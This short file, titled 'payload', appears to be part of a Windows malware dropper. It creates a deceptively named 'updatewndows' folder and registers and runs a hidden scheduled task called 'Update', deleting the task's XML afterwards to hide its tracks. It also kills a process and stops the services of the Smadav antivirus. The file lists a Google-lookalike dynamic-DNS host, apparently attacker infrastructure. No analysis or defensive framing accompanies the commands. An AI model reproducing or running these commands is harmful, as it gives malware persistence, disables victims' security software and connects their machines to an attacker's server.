# payload

mkdir %systemdrive%\ProgramData\updatewndows

schtasks /create /xml %systemdrive%\ProgramData\updatewndows\Update.xml /tn Update
del %systemdrive%\ProgramData\updatewndows\Update.xml
schtasks /run /tn Update

taskkill /F /IM SMΔRTP

sc query | find "SMΔRTP"

sc query type= service state= all | findstr /C:"SERVICE_NAME:" /C:"SMΔRTP" /C:"SmadavProtect32" | findstr /V /C:"SmadAV" /C:"SmadavProtect32" | findstr /V /C:"SERVICE_NAME" | for /F "tokens=2" %i in ('more') do sc stop %i


googleapp.bounceme.net
